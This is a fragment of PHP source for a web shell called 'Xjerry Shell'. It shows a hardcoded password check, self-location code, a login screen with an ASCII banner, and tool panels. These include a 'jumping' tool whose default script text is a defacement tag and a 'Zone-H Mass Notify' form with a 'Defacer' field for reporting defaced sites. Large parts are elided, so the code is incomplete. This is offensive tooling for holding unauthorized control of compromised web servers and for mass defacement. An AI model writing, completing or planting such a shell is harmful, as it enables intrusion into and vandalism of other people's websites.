...
$MyPass = 'bo_lana'; // Password Default: z7
function dup($pass,$n){
if($_GET['pass'] == $pass){
$f =  __FILE__;
$d =  __DIR__;
...
echo "<center><font size='6px' color='lavender'>^_^ Xjerry Shell *_*</font><br></center>
    <div class='pausi'>
...
if ($_GET['logout'] == 'true') {
    ...
    if ($_GET['tools'] == 'jumping') {
        ...
        if ($_POST['start']) {
            ...
            <textarea name='script' style='width: 450px; height: 200px;'>0wNeD By Xjerry</textarea><br>
        ...
        <font size='7' color='red' face='Orbitron'>Zone-H Mass Notify</font><br>";
            echo "<br>
            <form method='post'>
            <input style='width: 350px;' type='text' name='nick' placeholder='Defacer' value=Xjerry><br><br>
...
function pausi_login()
{
  ...
  <pre>
  /     |                          /  |                   /  |      /       \                          /  |          
  $$$$$ |  ______   _______    ____$$ |  ______   ______  $$ |      $$$$$$$  | ______   _______    ____$$ |  ______  
     $$ | /      \ /       \  /    $$ | /      \ /      \ $$ |      $$ |__$$ |/      \ /       \  /    $$ | /      \ 
__   $$ |/$$$$$$  |$$$$$$$  |/$$$$$$$ |/$$$$$$  |$$$$$$  |$$ |      $$    $$/ $$$$$$  |$$$$$$$  |/$$$$$$$ | $$$$$$  |
/  |  $$ |$$    $$ |$$ |  $$ |$$ |  $$ |$$ |  $$/ /    $$ |$$ |      $$$$$$$/  /    $$ |$$ |  $$ |$$ |  $$ | /    $$ |
$$ \__$$ |$$$$$$$$/ $$ |  $$ |$$ \__$$ |$$ |     /$$$$$$$ |$$ |      $$ |     /$$$$$$$ |$$ |  $$ |$$ \__$$ |/$$$$$$$ |
